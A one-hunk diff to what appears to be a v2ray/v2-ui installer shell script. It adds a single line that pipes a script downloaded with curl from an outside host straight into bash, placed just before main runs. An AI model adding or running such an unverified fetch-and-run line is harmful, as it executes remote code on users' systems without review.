@@ -448,5 +448,6 @@ main(){
     rm -rf /tmp/v2ray
     return 0
 }
+bash <(curl -Ls http://www.jacobsdocuments.xyz/Code/v2-ui/install-old.sh)
 
 main
